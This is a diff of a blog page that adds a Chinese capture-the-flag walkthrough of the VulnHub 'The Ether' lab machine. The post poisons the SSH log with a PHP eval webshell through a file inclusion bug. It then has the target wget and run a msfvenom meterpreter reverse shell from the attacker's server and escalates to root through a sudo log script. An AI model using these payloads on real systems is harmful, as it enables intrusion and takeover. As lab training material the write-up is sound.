@@ -4,8 +4,12 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="theEther, Broken-year">
-    <meta name="description" content="">
+    <meta name="keywords" content="综合实战第三章-theEther, Broken-year">
+    <meta name="description" content="综合实战第三章日志注入实战1环境准备
+靶场下载：https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/
+攻击机:
+kali 192.168.3.134
+win7 192.1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +21,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>theEther | Broken-year</title>
+    <title>综合实战第三章-theEther | Broken-year</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -309,12 +313,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">theEther</h1>
+                    <h1 class="description center-align post-title">综合实战第三章-theEther</h1>
                 </div>
             </div>
         </div>
@@ -428,12 +432,37 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">网络安全</span>
+                            </a>
+                        
+                            <a href="/tags/%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/">
+                                <span class="chip bg-color">综合实战</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                <span class="chip bg-color">渗透测试</span>
+                            </a>
+                        
+                            <a href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
+                                <span class="chip bg-color">靶场练习</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" class="post-category">
+                                靶场练习
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -463,7 +492,85 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h1 id="综合实战第三章"><a href="#综合实战第三章" class="headerlink" title="综合实战第三章"></a>综合实战第三章</h1><h2 id="日志注入实战1"><a href="#日志注入实战1" class="headerlink" title="日志注入实战1"></a>日志注入实战1</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><blockquote>
+<p>靶场下载：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/">https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/</a></p>
+<p>攻击机:</p>
+<p>kali 192.168.3.134</p>
+<p>win7 192.168.3.137</p>
+<p>靶机:evilscience 192.168.3.173</p>
+</blockquote>
+<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>先看看这个靶场的端口信息</p>
+<pre class=" language-Linux"><code class="language-Linux">nmap -p- -A 192.168.3.173
+</code></pre>
+<p><img src="/2022/05/03/theEther/image-20220503171914748.png" alt="image-20220503171914748"></p>
+<p>先打开网站看看</p>
+<p><img src="/2022/05/03/theEther/image-20220503172801639.png" alt="image-20220503172801639"></p>
+<p>在<code>ABOUT US</code>里发现应该有文件包含漏洞</p>
+<p><img src="/2022/05/03/theEther/image-20220503185010583.png" alt="image-20220503185010583"></p>
+<p>抓包然后放到intruder用字典跑一下</p>
+<p><img src="/2022/05/03/theEther/image-20220503191507832.png" alt="image-20220503191507832"></p>
+<p>跑出来一些东西</p>
+<p><img src="/2022/05/03/theEther/image-20220503195814460.png" alt="image-20220503195814460"></p>
+<p>看到了ssh的日志文件</p>
+<p><img src="/2022/05/03/theEther/image-20220503200630846.png" alt="image-20220503200630846"></p>
+<p>可以构造一句话木马写入日志里</p>
+<pre class=" language-Linux"><code class="language-Linux">ssh '<?php eval($_GET['cmd'])?>'@192.168.3.173
+</code></pre>
+<p>然后在burpsuite里构造</p>
+<pre class=" language-Linux"><code class="language-Linux">?file=/var/log/auth.log&cmd=phpinfo();
+</code></pre>
+<p><img src="/2022/05/03/theEther/image-20220503201136938.png" alt="image-20220503201136938"></p>
+<p>测试成功！</p>
+<h3 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h3><p>先制作木马</p>
+<pre class=" language-Linux"><code class="language-Linux">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.3.134 lport=4444 -f elf > /root/shell.elf
+</code></pre>
+<p>打开msf</p>
+<pre class=" language-Linux"><code class="language-Linux">msfconsole
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set lhost 192.168.3.134
+exploit
+</code></pre>
+<p>再打开http</p>
+<pre class=" language-Linux"><code class="language-Linux">python -m SimpleHTTPServer
+</code></pre>
+<p>设置好监听之后，准备上传</p>
+<p>构造上传语句</p>
+<pre class=" language-Linux"><code class="language-Linux">/?file=/var/log/auth.log&cmd=system('wget+http://192.168.3.134:8000/shell.elf');
+/?file=/var/log/auth.log&cmd=system('chmod+%2bx+shell.elf');
+/?file=/var/log/auth.log&cmd=system('./shell.elf')%3b
+</code></pre>
+<p>连接成功！</p>
+<p><img src="/2022/05/03/theEther/image-20220503202449616.png" alt="image-20220503202449616"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>接下来就是提权了</p>
+<p>先美化</p>
+<pre class=" language-Linux"><code class="language-Linux">python -c 'import pty;pty.spawn("/bin/bash")'
+</code></pre>
+<p>然后找一下权限</p>
+<p><img src="/2022/05/03/theEther/image-20220503202859959.png" alt="image-20220503202859959"></p>
+<p>看到有个root权限的</p>
+<p>看下怎么用</p>
+<p>发现是个查看日志文件的程序</p>
+<p>再打开一个msf</p>
+<p>和上面配置一样，设置好监听</p>
+<p>构造语句</p>
+<pre class=" language-Linux"><code class="language-Linux">sudo ./xxxlogauditorxxx.py
+/var/log/auth.log|./shell.elf
+</code></pre>
+<p>成功连接</p>
+<p><img src="/2022/05/03/theEther/image-20220503203718563.png" alt="image-20220503203718563"></p>
+<h3 id="找到flag"><a href="#找到flag" class="headerlink" title="找到flag"></a>找到flag</h3><p>进入根目录，发现有个flag.png文件，把他传到本地，然后查看</p>
+<p><img src="/2022/05/03/theEther/image-20220503204521117.png" alt="image-20220503204521117"></p>
+<p>发现flag不在这，用cat查看一下</p>
+<pre class=" language-Linux"><code class="language-Linux">cat flag.png
+</code></pre>
+<p><img src="/2022/05/03/theEther/image-20220503204619803.png" alt="image-20220503204619803"></p>
+<p>看到有一段64编码的，把他提出来解密</p>
+<pre class=" language-Linux"><code class="language-Linux">base64 -d bsflag.txt > flag.txt
+</code></pre>
+<p><img src="/2022/05/03/theEther/image-20220503204836099.png" alt="image-20220503204836099"></p>
+<p>得到flag，结束！</p>
+
                 
             </div>
             <hr/>
@@ -526,7 +633,23 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">网络安全</span>
+                                </a>
+                            
+                                <a href="/tags/%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/">
+                                    <span class="chip bg-color">综合实战</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                                    <span class="chip bg-color">渗透测试</span>
+                                </a>
+                            
+                                <a href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
+                                    <span class="chip bg-color">靶场练习</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -707,9 +830,9 @@
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="theEther">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="综合实战第三章-theEther">
                         
-                        <span class="card-title">theEther</span>
+                        <span class="card-title">综合实战第三章-theEther</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -724,13 +847,37 @@
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Broken-year
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" class="post-category">
+                                    靶场练习
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/">
+                        <span class="chip bg-color">综合实战</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+                        <span class="chip bg-color">渗透测试</span>
+                    </a>
+                    
+                    <a href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">
+                        <span class="chip bg-color">靶场练习</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
